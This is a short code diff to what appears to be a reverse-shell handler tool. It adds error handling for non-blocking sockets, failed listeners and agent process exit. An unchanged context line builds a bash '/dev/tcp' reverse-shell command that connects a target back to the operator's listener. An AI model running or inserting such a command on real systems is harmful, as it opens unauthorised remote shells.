@@ -1859,7 +1859,8 @@ class Core:
 						data = readable.socket.recv(options.network_buffer_size)
 						if not data:
 							raise OSError
-
+					except BlockingIOError:
+						continue
 					except OSError:
 						logger.debug("Died while reading")
 						readable.kill()
@@ -1913,6 +1914,8 @@ class Core:
 				with writable.wlock:
 					try:
 						sent = writable.socket.send(writable.outbuf.getvalue())
+					except BlockingIOError:
+						continue
 					except OSError:
 						logger.debug("Died while writing")
 						writable.kill()
@@ -2930,6 +2933,8 @@ class Session:
 							elif hasattr(stdin_src, 'recv'):
 								try:
 									data = stdin_src.recv(options.network_buffer_size)
+								except BlockingIOError:
+									continue
 								except OSError:
 									data = b""
 							else:
@@ -4159,6 +4164,9 @@ class Session:
 
 					if not next((listener for listener in core.listeners.values() if listener.port == port), None):
 						new_listener = TCPListener(host, port)
+						if not new_listener:
+							logger.error(f"Cannot listen on {host}:{port}. Spawning shell aborted")
+							return False
 
 				if self.bin['bash']:
 					cmd = f'printf "(bash >& /dev/tcp/{host}/{port} 0>&1) &"|bash'
@@ -4571,6 +4579,10 @@ def agent():
 		pty.setraw(pty.STDIN_FILENO)
 	except:
 		pass
+	try:
+		signal.signal(signal.SIGCHLD, signal.SIG_IGN)
+	except:
+		pass
 
 	try:
 		streams = dict()
@@ -4585,7 +4597,7 @@ def agent():
 
 		rlist = [control_out, master_fd, pty.STDIN_FILENO]
 		wlist = []
-		for fd in (master_fd, pty.STDIN_FILENO, pty.STDOUT_FILENO, pty.STDERR_FILENO): # TODO
+		for fd in (master_fd, pty.STDIN_FILENO, pty.STDOUT_FILENO, pty.STDERR_FILENO):
 			flags = fcntl.fcntl(fd, fcntl.F_GETFL)
 			fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
 			cloexec(fd)
@@ -4741,8 +4753,7 @@ def agent():
 		os.close(master_fd)
 	except:
 		pass
-	os.waitpid(shell_pid, 0)[1]
-	os.kill(os.getppid(), signal.SIGKILL) # TODO
+	os._exit(0)
 
 
 def modules():
